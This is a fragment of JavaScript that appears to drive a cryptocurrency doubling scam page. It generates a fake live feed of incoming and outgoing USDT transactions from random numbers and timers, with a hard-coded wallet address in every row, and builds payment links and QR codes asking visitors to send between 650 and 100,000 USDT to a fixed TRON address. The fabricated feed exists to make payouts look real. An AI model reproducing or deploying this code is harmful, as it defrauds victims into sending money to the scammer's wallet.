...
function create_transaction(mins) {
  ...
  row.innerHTML =
    '<tr  class="tr"> <td><a class="hash-tag text-truncate" >' +
    generateId(63) +
    '</a> </td> <td class="d-none d-sm-table-cell"><a >9' +
    tx(99999999) +
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span> </td> <td><a class="hash-tag text-truncate" >' +
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">bc1qtz2rcqjyrxsnjvf9nnklhqqyv5tmwfcv37chk3</span> </td> <td>' +
    amount +
    ' USDT</td> <td><span class="small text-secondary">0<b>.</b>000' +
    tx(999) +
    "</span></td> </tr>";
  var table,
    row = (table = document.getElementById("myTable")).insertRow(1),
  ...
  row.innerHTML =
    '<tr> <td><a class="hash-tag text-truncate" >' +
    generateId(63) +
    '</a> </td> <td class="d-none d-sm-table-cell"><a >9' +
    tx(99999999) +
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span></td> <td><span class="hash-tag text-truncate">bc1qtz2rcqjyrxsnjvf9nnklhqqyv5tmwfcv37chk3</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" >' +
    address +
    "</a> </td> <td>" +
    send_amount +
    ' USDT</td> <td><span class="small text-secondary">0<b>.</b>000' +
...
function new_transaction() {
  var table,
    ...
    address = get_random(),
    amount = (2 * Math.random()).toFixed(2) * 1000,
    decimal = String(Math.random(1, 999));
  (row.innerHTML =
    '<tr> <td><a class="hash-tag text-truncate" >' +
    generateId(63) +
    ...
    setTimeout(() => {
      ...
      (row.innerHTML =
        ...
        '</a> </td> <td class="d-none d-sm-table-cell"><a >9' +
        tx(99999999) +
        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">bc1qtz2rcqjyrxsnjvf9nnklhqqyv5tmwfcv37chk3</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" >' +
        address +
        "</a> </td> <td>" +
        send_amount +
        ' USDT</td> <td><span class="small text-secondary">0<b>.</b>000' +
...
(get_random = function (
  ...
  $("#gen-btn").click(() => {
    if ($("#cal-in").val() >= 650 && $("#cal-in").val() <= 100000) {
      amount_entered = $("#cal-in").val();
      tm = Date.now();
      $("#gen-amount").text(amount_entered);
      $("#qrcode_svg").attr("src", "../files/usdt.jpeg");
      $("#paynow")
        .parent()
        .attr(
          "href",
          "usdt:TT8EGsmKfhtfKJYBPZvAfJJiDbqwXkZ5MX?amount=" +
            amount_entered +
      ...
      $("#warn")
        .text("Amount should be within 650 USDT to 1,00,000 USDT")
        .css("color", "red");
  }),
  $("#close").click(() => {
